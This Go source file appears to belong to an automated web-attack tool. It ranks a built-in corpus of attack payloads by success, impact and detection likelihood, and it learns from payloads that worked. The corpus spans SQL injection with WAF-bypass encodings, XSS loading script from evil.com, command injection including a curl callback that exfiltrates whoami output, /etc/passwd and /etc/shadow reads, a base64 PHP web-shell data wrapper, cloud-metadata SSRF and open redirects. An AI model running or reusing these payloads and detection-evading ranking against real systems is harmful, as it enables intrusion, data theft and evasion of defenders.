package corpus

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"sort"
	"strings"
	"sync"
)

type Payload struct {
	Value       string
	VulnClass   string
	TechStack   []string
	CVSS        float64
	Psuccess    float64
	Pdetect     float64
	Cost        float64
	Strategic   float64
	Encoding    string
	Description string
}

type CorpusRanker struct {
	mu     sync.RWMutex
	corpus []Payload
	enc    *PayloadEncryptor
}

type PayloadEncryptor struct {
	mu   sync.RWMutex
	key  []byte
	aead cipher.AEAD
}

func NewPayloadEncryptor(key []byte) (*PayloadEncryptor, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("encryption key must be 32 bytes for AES-256-GCM")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM mode: %w", err)
	}

	return &PayloadEncryptor{
		key:  append([]byte(nil), key...),
		aead: aead,
	}, nil
}

func (pe *PayloadEncryptor) Encrypt(plaintext string) (string, error) {
	pe.mu.RLock()
	defer pe.mu.RUnlock()

	nonce := make([]byte, pe.aead.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf("failed to generate nonce: %w", err)
	}

	ciphertext := pe.aead.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (pe *PayloadEncryptor) Decrypt(encoded string) (string, error) {
	pe.mu.RLock()
	defer pe.mu.RUnlock()

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf("failed to decode ciphertext: %w", err)
	}

	nonceSize := pe.aead.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := pe.aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %w", err)
	}

	return string(plaintext), nil
}

func (pe *PayloadEncryptor) RotateKey(newKey []byte) error {
	if len(newKey) != 32 {
		return fmt.Errorf("encryption key must be 32 bytes for AES-256-GCM")
	}

	block, err := aes.NewCipher(newKey)
	if err != nil {
		return fmt.Errorf("failed to create AES cipher: %w", err)
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("failed to create GCM mode: %w", err)
	}

	pe.mu.Lock()
	defer pe.mu.Unlock()
	pe.key = append([]byte(nil), newKey...)
	pe.aead = aead
	return nil
}

func (pe *PayloadEncryptor) KeyID() string {
	pe.mu.RLock()
	defer pe.mu.RUnlock()
	if len(pe.key) == 0 {
		return "none"
	}
	return base64.StdEncoding.EncodeToString(pe.key[:8])
}

func NewRanker() (*CorpusRanker, error) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("failed to generate encryption key: %w", err)
	}
	enc, err := NewPayloadEncryptor(key)
	if err != nil {
		return nil, err
	}
	return &CorpusRanker{corpus: defaultPayloads(), enc: enc}, nil
}

func NewRankerWithEncryption(key []byte) (*CorpusRanker, error) {
	enc, err := NewPayloadEncryptor(key)
	if err != nil {
		return nil, err
	}
	return &CorpusRanker{
		corpus: defaultPayloads(),
		enc:    enc,
	}, nil
}

func (cr *CorpusRanker) RankedPayloads(vulnClass string, techStack []string, wafDetected bool) []Payload {
	cr.mu.RLock()
	defer cr.mu.RUnlock()
	var candidates []Payload
	for _, p := range cr.corpus {
		if p.VulnClass != vulnClass {
			continue
		}
		if cr.matchesTechStack(p, techStack) {
			candidates = append(candidates, p)
		}
	}

	if len(candidates) == 0 {
		for _, p := range cr.corpus {
			if p.VulnClass == vulnClass {
				candidates = append(candidates, p)
			}
		}
	}

	sort.Slice(candidates, func(i, j int) bool {
		evI := cr.evScore(candidates[i], wafDetected)
		evJ := cr.evScore(candidates[j], wafDetected)
		return evI > evJ
	})

	return candidates
}

func (cr *CorpusRanker) evScore(p Payload, wafDetected bool) float64 {
	Psuccess := p.Psuccess
	if p.Strategic > 0 {
		Psuccess = (p.Psuccess + p.Strategic) / 2
	}
	Impact := p.CVSS / 10.0
	if Impact == 0 {
		Impact = 0.5
	}
	Pdetect := p.Pdetect
	if wafDetected {
		Pdetect += 0.3
	}
	Cost := p.Cost
	if Cost == 0 {
		Cost = 1.0
	}
	EV := Psuccess*Impact - Pdetect*Cost*2.0 - Cost*0.5
	return math.Round(EV*100) / 100
}

func (cr *CorpusRanker) matchesTechStack(p Payload, techStack []string) bool {
	if len(p.TechStack) == 0 {
		return true
	}
	for _, pt := range p.TechStack {
		for _, tt := range techStack {
			if contains(pt, tt) || contains(tt, pt) {
				return true
			}
		}
	}
	return false
}

func (cr *CorpusRanker) TopN(n int, vulnClass string, techStack []string, wafDetected bool) []Payload {
	ranked := cr.RankedPayloads(vulnClass, techStack, wafDetected)
	if n > 0 && len(ranked) > n {
		return ranked[:n]
	}
	return ranked
}

func contains(a, b string) bool {
	return len(a) > 0 && len(b) > 0 && (a == b || strings.Contains(a, b) || strings.Contains(b, a))
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func defaultPayloads() []Payload {
	return []Payload{
		{Value: "' OR '1'='1", VulnClass: "sqli", TechStack: []string{"php", "asp"}, CVSS: 9.8, Psuccess: 0.85, Pdetect: 0.1, Cost: 1, Description: "Classic auth bypass"},
		{Value: "admin' --", VulnClass: "sqli", TechStack: []string{"php", "asp", "jsp"}, CVSS: 9.8, Psuccess: 0.75, Pdetect: 0.1, Cost: 1, Description: "Comment-based auth bypass"},
		{Value: "' OR 1=1--", VulnClass: "sqli", TechStack: []string{"php"}, CVSS: 9.8, Psuccess: 0.80, Pdetect: 0.15, Cost: 1, Description: "Boolean-based blind"},
		{Value: "'; WAITFOR DELAY '0:0:5'--", VulnClass: "sqli", TechStack: []string{"mssql"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.2, Cost: 2, Description: "MSSQL time-based blind"},
		{Value: "1' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 1 END)--", VulnClass: "sqli", TechStack: []string{"mssql"}, CVSS: 9.8, Psuccess: 0.65, Pdetect: 0.2, Cost: 2, Description: "MSSQL error-based"},
		{Value: "' UNION SELECT NULL--", VulnClass: "sqli", TechStack: []string{"mysql", "postgres"}, CVSS: 9.8, Psuccess: 0.60, Pdetect: 0.15, Cost: 1, Description: "Union-based"},
		{Value: "1 AND 1=1", VulnClass: "sqli", TechStack: []string{"php", "asp", "jsp", "node"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.1, Cost: 1, Description: "Boolean injection"},
		{Value: "'+OR+'1'='1", VulnClass: "sqli", TechStack: []string{"node", "python"}, CVSS: 9.8, Psuccess: 0.60, Pdetect: 0.15, Cost: 1, Description: "URL-encoded OR bypass"},
		{Value: "1'%09OR%09'1'='1", VulnClass: "sqli", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.50, Pdetect: 0.25, Cost: 1, Encoding: "url_tab", Description: "WAF bypass via tab"},
		{Value: "'/**/OR/**/'1'='1", VulnClass: "sqli", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.55, Pdetect: 0.25, Cost: 1, Encoding: "comment", Description: "SQL comment WAF bypass"},
		{Value: "' UnIoN SeLeCt 1,2,3--", VulnClass: "sqli", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.50, Pdetect: 0.3, Cost: 1, Encoding: "case_mix", Description: "Case-mixed union"},
		{Value: "1' ORDER BY 1--", VulnClass: "sqli", TechStack: []string{"mysql", "postgres", "mssql"}, CVSS: 9.8, Psuccess: 0.75, Pdetect: 0.1, Cost: 1, Description: "Column enumeration"},
		{Value: "1' INTO OUTFILE '/tmp/ares.txt'", VulnClass: "sqli", TechStack: []string{"mysql"}, CVSS: 9.8, Psuccess: 0.40, Pdetect: 0.2, Cost: 2, Description: "File write"},
		{Value: "1' AND SLEEP(5)--", VulnClass: "sqli", TechStack: []string{"mysql", "postgres"}, CVSS: 9.8, Psuccess: 0.65, Pdetect: 0.2, Cost: 2, Description: "MySQL time-based blind"},
		{Value: "1; SELECT pg_sleep(5)--", VulnClass: "sqli", TechStack: []string{"postgres"}, CVSS: 9.8, Psuccess: 0.65, Pdetect: 0.2, Cost: 2, Description: "Postgres time-based blind"},
		{Value: "1' and 1=1--", VulnClass: "sqli", TechStack: []string{"php"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.1, Cost: 1, Encoding: "no_space", Description: "No-space variant"},
		{Value: "<script>alert(1)</script>", VulnClass: "xss", TechStack: []string{"php", "html", "angular", "vue"}, CVSS: 6.1, Psuccess: 0.80, Pdetect: 0.1, Cost: 1, Description: "Classic script tag"},
		{Value: "<img src=x onerror=alert(1)>", VulnClass: "xss", TechStack: []string{"php", "html", "react"}, CVSS: 6.1, Psuccess: 0.75, Pdetect: 0.15, Cost: 1, Description: "Img onerror"},
		{Value: "<svg onload=alert(1)>", VulnClass: "xss", TechStack: []string{"html"}, CVSS: 6.1, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "SVG onload"},
		{Value: "<iframe src=\"javascript:alert(1)\">", VulnClass: "xss", TechStack: []string{"html"}, CVSS: 6.1, Psuccess: 0.65, Pdetect: 0.15, Cost: 1, Description: "iframe javascript"},
		{Value: "javascript:alert(1)", VulnClass: "xss", TechStack: []string{"html", "angular"}, CVSS: 6.1, Psuccess: 0.60, Pdetect: 0.15, Cost: 1, Description: "javascript: protocol"},
		{Value: "<body onload=alert(1)>", VulnClass: "xss", TechStack: []string{"html"}, CVSS: 6.1, Psuccess: 0.65, Pdetect: 0.15, Cost: 1, Description: "body onload"},
		{Value: "<marquee onstart=alert(1)>", VulnClass: "xss", TechStack: []string{"html"}, CVSS: 6.1, Psuccess: 0.55, Pdetect: 0.2, Cost: 1, Description: "marquee tag"},
		{Value: "'><script>alert(1)</script>", VulnClass: "xss", TechStack: []string{"php", "jsp"}, CVSS: 6.1, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "Breakout from attribute"},
		{Value: "\"><script>alert(1)</script>", VulnClass: "xss", TechStack: []string{"php", "jsp"}, CVSS: 6.1, Psuccess: 0.65, Pdetect: 0.15, Cost: 1, Description: "Double-quote breakout"},
		{Value: "<scr<script>ipt>alert(1)</scr</script>ipt>", VulnClass: "xss", TechStack: []string{"html"}, CVSS: 6.1, Psuccess: 0.50, Pdetect: 0.3, Cost: 1, Encoding: "nested", Description: "Nested script WAF bypass"},
		{Value: "<ScRiPt>alert(1)</sCrIpT>", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.55, Pdetect: 0.3, Cost: 1, Encoding: "case_mix", Description: "Case-mixed bypass"},
		{Value: "<img src=\"x\" onerror=\"alert&#40;1&#41;\">", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.45, Pdetect: 0.35, Cost: 1, Encoding: "html_entity", Description: "HTML entity encode"},
		{Value: "<svg><script>alert&lpar;1&rpar;</script>", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.40, Pdetect: 0.35, Cost: 1, Encoding: "entity", Description: "Entity encode bypass"},
		{Value: "<script>alert(String.fromCharCode(49))</script>", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.45, Pdetect: 0.3, Cost: 1, Encoding: "charcode", Description: "CharCode bypass"},
		{Value: "<!--<script>alert(1)</script>-->", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.35, Pdetect: 0.4, Cost: 1, Encoding: "comment", Description: "HTML comment breakout"},
		{Value: "<script src=//evil.com/xss.js></script>", VulnClass: "xss", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.55, Pdetect: 0.2, Cost: 1, Description: "External script ref"},
		{Value: "id", VulnClass: "cmd_injection", TechStack: []string{"php", "python", "node", "ruby"}, CVSS: 9.8, Psuccess: 0.80, Pdetect: 0.1, Cost: 1, Description: "Command separator"},
		{Value: ";id", VulnClass: "cmd_injection", TechStack: []string{"php", "python", "node"}, CVSS: 9.8, Psuccess: 0.80, Pdetect: 0.1, Cost: 1, Description: "Semicolon separator"},
		{Value: "|id", VulnClass: "cmd_injection", TechStack: []string{"php", "python", "node"}, CVSS: 9.8, Psuccess: 0.75, Pdetect: 0.15, Cost: 1, Description: "Pipe separator"},
		{Value: "`id`", VulnClass: "cmd_injection", TechStack: []string{"php", "bash"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "Backtick injection"},
		{Value: "$(id)", VulnClass: "cmd_injection", TechStack: []string{"bash", "sh"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "Subshell injection"},
		{Value: "&&id", VulnClass: "cmd_injection", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "AND chain"},
		{Value: "||id", VulnClass: "cmd_injection", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.60, Pdetect: 0.2, Cost: 1, Description: "OR chain"},
		{Value: "0||whoami", VulnClass: "cmd_injection", TechStack: []string{}, CVSS: 9.8, Psuccess: 0.55, Pdetect: 0.25, Cost: 1, Encoding: "logic", Description: "Logic bypass"},
		{Value: "ping -c 3 127.0.0.1", VulnClass: "cmd_injection", TechStack: []string{"php", "node"}, CVSS: 9.8, Psuccess: 0.75, Pdetect: 0.2, Cost: 2, Description: "Time-based"},
		{Value: "curl http://callback/?id=$(whoami)", VulnClass: "cmd_injection", TechStack: []string{"php", "node"}, CVSS: 9.8, Psuccess: 0.65, Pdetect: 0.15, Cost: 1, Description: "OOB exfil"},
		{Value: "/etc/passwd", VulnClass: "lfi", TechStack: []string{"php", "python", "node", "apache", "nginx"}, CVSS: 7.5, Psuccess: 0.85, Pdetect: 0.05, Cost: 1, Description: "Linux passwd"},
		{Value: "../../etc/passwd", VulnClass: "lfi", TechStack: []string{"php"}, CVSS: 7.5, Psuccess: 0.75, Pdetect: 0.1, Cost: 1, Description: "Classic traversal"},
		{Value: "....//....//....//etc/passwd", VulnClass: "lfi", TechStack: []string{}, CVSS: 7.5, Psuccess: 0.50, Pdetect: 0.3, Cost: 1, Encoding: "dot_dup", Description: "Doubled dot bypass"},
		{Value: "/etc/shadow", VulnClass: "lfi", TechStack: []string{"php", "apache"}, CVSS: 9.8, Psuccess: 0.40, Pdetect: 0.3, Cost: 1, Description: "Shadow file (needs root)"},
		{Value: "php://filter/convert.base64-encode/resource=index.php", VulnClass: "lfi", TechStack: []string{"php"}, CVSS: 8.0, Psuccess: 0.70, Pdetect: 0.2, Cost: 1, Encoding: "php_wrapper", Description: "PHP filter wrapper"},
		{Value: "expect://id", VulnClass: "lfi", TechStack: []string{"php"}, CVSS: 9.8, Psuccess: 0.30, Pdetect: 0.4, Cost: 1, Encoding: "expect", Description: "PHP expect wrapper"},
		{Value: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", VulnClass: "lfi", TechStack: []string{"php"}, CVSS: 9.8, Psuccess: 0.25, Pdetect: 0.4, Cost: 2, Encoding: "data_wrapper", Description: "Data wrapper RCE"},
		{Value: "/proc/self/environ", VulnClass: "lfi", TechStack: []string{"linux", "apache", "nginx"}, CVSS: 8.0, Psuccess: 0.55, Pdetect: 0.2, Cost: 1, Description: "Process env"},
		{Value: "/var/log/apache2/access.log", VulnClass: "lfi", TechStack: []string{"apache"}, CVSS: 7.5, Psuccess: 0.50, Pdetect: 0.25, Cost: 2, Description: "Log file poisoning"},
		{Value: "C:\\windows\\win.ini", VulnClass: "lfi", TechStack: []string{"iis", "asp"}, CVSS: 7.5, Psuccess: 0.65, Pdetect: 0.1, Cost: 1, Description: "Windows win.ini"},
		{Value: "{{7*7}}", VulnClass: "ssti", TechStack: []string{"jinja2", "flask", "python", "django"}, CVSS: 9.8, Psuccess: 0.85, Pdetect: 0.1, Cost: 1, Description: "Jinja2 math"},
		{Value: "${7*7}", VulnClass: "ssti", TechStack: []string{"thymeleaf", "spring", "java"}, CVSS: 9.8, Psuccess: 0.75, Pdetect: 0.15, Cost: 1, Description: "Spring EL"},
		{Value: "<%= 7*7 %>", VulnClass: "ssti", TechStack: []string{"erb", "ruby", "rails"}, CVSS: 9.8, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "ERB Ruby"},
		{Value: "{{config}}", VulnClass: "ssti", TechStack: []string{"jinja2", "flask"}, CVSS: 9.8, Psuccess: 0.60, Pdetect: 0.2, Cost: 1, Description: "Config extraction"},
		{Value: "{{request|attr('application')}}", VulnClass: "ssti", TechStack: []string{"jinja2"}, CVSS: 9.8, Psuccess: 0.50, Pdetect: 0.3, Cost: 1, Description: "Jinja2 request object"},
		{Value: "${{7*7}}", VulnClass: "ssti", TechStack: []string{"freemarker", "java"}, CVSS: 9.8, Psuccess: 0.65, Pdetect: 0.2, Cost: 1, Description: "Freemarker"},
		{Value: "*{7*7}", VulnClass: "ssti", TechStack: []string{"thymeleaf", "spring"}, CVSS: 9.8, Psuccess: 0.55, Pdetect: 0.25, Cost: 1, Encoding: "spel", Description: "SPEL injection"},
		{Value: "{{''.class.forName('java.lang.Runtime').getRuntime().exec('id')}}", VulnClass: "ssti", TechStack: []string{"pebble", "java"}, CVSS: 9.8, Psuccess: 0.30, Pdetect: 0.4, Cost: 3, Description: "RCE via reflection"},
		{Value: "http://169.254.169.254/latest/meta-data/", VulnClass: "ssrf", TechStack: []string{"aws", "ec2"}, CVSS: 8.6, Psuccess: 0.70, Pdetect: 0.2, Cost: 1, Description: "AWS metadata"},
		{Value: "http://metadata.google.internal/computeMetadata/v1/", VulnClass: "ssrf", TechStack: []string{"gcp", "google cloud"}, CVSS: 8.6, Psuccess: 0.65, Pdetect: 0.25, Cost: 1, Description: "GCP metadata"},
		{Value: "http://localhost/admin", VulnClass: "ssrf", TechStack: []string{}, CVSS: 6.5, Psuccess: 0.60, Pdetect: 0.2, Cost: 1, Description: "Localhost admin access"},
		{Value: "http://127.0.0.1:8080", VulnClass: "ssrf", TechStack: []string{}, CVSS: 6.5, Psuccess: 0.55, Pdetect: 0.25, Cost: 1, Description: "Internal port scan"},
		{Value: "http://10.0.0.1/internal-api", VulnClass: "ssrf", TechStack: []string{}, CVSS: 6.5, Psuccess: 0.40, Pdetect: 0.3, Cost: 1, Description: "Internal network"},
		{Value: "http://169.254.169.254/latest/user-data/", VulnClass: "ssrf", TechStack: []string{"aws"}, CVSS: 8.6, Psuccess: 0.60, Pdetect: 0.25, Cost: 1, Description: "AWS user data"},
		{Value: "../etc/passwd", VulnClass: "path_traversal", TechStack: []string{"php", "node", "python"}, CVSS: 7.5, Psuccess: 0.75, Pdetect: 0.1, Cost: 1, Description: "Classic traversal"},
		{Value: "..%2f..%2fetc%2fpasswd", VulnClass: "path_traversal", TechStack: []string{}, CVSS: 7.5, Psuccess: 0.50, Pdetect: 0.3, Cost: 1, Encoding: "double_url", Description: "Double URL encode"},
		{Value: "..\\..\\windows\\win.ini", VulnClass: "path_traversal", TechStack: []string{"iis", "asp"}, CVSS: 7.5, Psuccess: 0.70, Pdetect: 0.15, Cost: 1, Description: "Windows traversal"},
		{Value: "....//....//....//etc/passwd", VulnClass: "path_traversal", TechStack: []string{}, CVSS: 7.5, Psuccess: 0.45, Pdetect: 0.35, Cost: 1, Encoding: "dot_dup", Description: "Dot doubling"},
		{Value: "https://evil.com", VulnClass: "open_redirect", TechStack: []string{"php", "node", "python"}, CVSS: 6.1, Psuccess: 0.80, Pdetect: 0.05, Cost: 1, Description: "Direct redirect"},
		{Value: "//evil.com", VulnClass: "open_redirect", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.75, Pdetect: 0.1, Cost: 1, Encoding: "protocol_relative", Description: "Protocol-relative"},
		{Value: "///evil.com", VulnClass: "open_redirect", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.70, Pdetect: 0.1, Cost: 1, Description: "Triple slash"},
		{Value: "https://google.com#.evil.com", VulnClass: "open_redirect", TechStack: []string{}, CVSS: 6.1, Psuccess: 0.60, Pdetect: 0.15, Cost: 1, Description: "Fragment-based"},
	}
}

func (cr *CorpusRanker) UpdateStrategicMemory(payload, techStack, vulnClass string, worked bool) {
	cr.mu.Lock()
	defer cr.mu.Unlock()
	for i := range cr.corpus {
		if cr.corpus[i].Value == payload && cr.corpus[i].VulnClass == vulnClass {
			if worked {
				cr.corpus[i].Strategic = floatMin(cr.corpus[i].Strategic+0.05, 1.0)
			} else {
				cr.corpus[i].Strategic = floatMax(cr.corpus[i].Strategic-0.02, 0.0)
			}
			return
		}
	}
}

func max(a, b float64) float64 {
	if a > b {
		return a
	}
	return b
}
func floatMin(a, b float64) float64 {
	if a < b {
		return a
	}
	return b
}
func floatMax(a, b float64) float64 {
	if a > b {
		return a
	}
	return b
}

func (cr *CorpusRanker) AddPayload(p Payload) {
	cr.mu.Lock()
	defer cr.mu.Unlock()
	cr.corpus = append(cr.corpus, p)
}

func (cr *CorpusRanker) PayloadCount() int {
	cr.mu.RLock()
	defer cr.mu.RUnlock()
	return len(cr.corpus)
}

func (cr *CorpusRanker) Stats() map[string]int {
	cr.mu.RLock()
	defer cr.mu.RUnlock()
	stats := make(map[string]int)
	for _, p := range cr.corpus {
		stats[p.VulnClass]++
	}
	return stats
}

func (cr *CorpusRanker) EncryptPayloads() ([]string, error) {
	if cr.enc == nil {
		return nil, fmt.Errorf("encryptor not initialized")
	}

	cr.mu.RLock()
	defer cr.mu.RUnlock()

	encrypted := make([]string, len(cr.corpus))
	for i, p := range cr.corpus {
		data, err := json.Marshal(p)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal payload %d: %w", i, err)
		}
		enc, err := cr.enc.Encrypt(string(data))
		if err != nil {
			return nil, fmt.Errorf("failed to encrypt payload %d: %w", i, err)
		}
		encrypted[i] = enc
	}
	return encrypted, nil
}

func (cr *CorpusRanker) DecryptAndLoad(encrypted []string) error {
	if cr.enc == nil {
		return fmt.Errorf("encryptor not initialized")
	}

	cr.mu.Lock()
	defer cr.mu.Unlock()

	cr.corpus = make([]Payload, len(encrypted))
	for i, enc := range encrypted {
		data, err := cr.enc.Decrypt(enc)
		if err != nil {
			return fmt.Errorf("failed to decrypt payload %d: %w", i, err)
		}
		var p Payload
		if err := json.Unmarshal([]byte(data), &p); err != nil {
			return fmt.Errorf("invalid payload JSON at index %d: %w", i, err)
		}
		cr.corpus[i] = p
	}
	return nil
}

func (cr *CorpusRanker) SetEncryptor(key []byte) error {
	enc, err := NewPayloadEncryptor(key)
	if err != nil {
		return err
	}
	cr.mu.Lock()
	defer cr.mu.Unlock()
	cr.enc = enc
	return nil
}

func (cr *CorpusRanker) RotateEncryptionKey(newKey []byte) error {
	cr.mu.RLock()
	defer cr.mu.RUnlock()
	if cr.enc == nil {
		return fmt.Errorf("encryptor not initialized")
	}
	return cr.enc.RotateKey(newKey)
}

func (cr *CorpusRanker) EncryptionKeyID() string {
	cr.mu.RLock()
	defer cr.mu.RUnlock()
	if cr.enc == nil {
		return "none"
	}
	return cr.enc.KeyID()
}

func parseFloat(s string) float64 {
	var f float64
	fmt.Sscanf(s, "%f", &f)
	return f
}
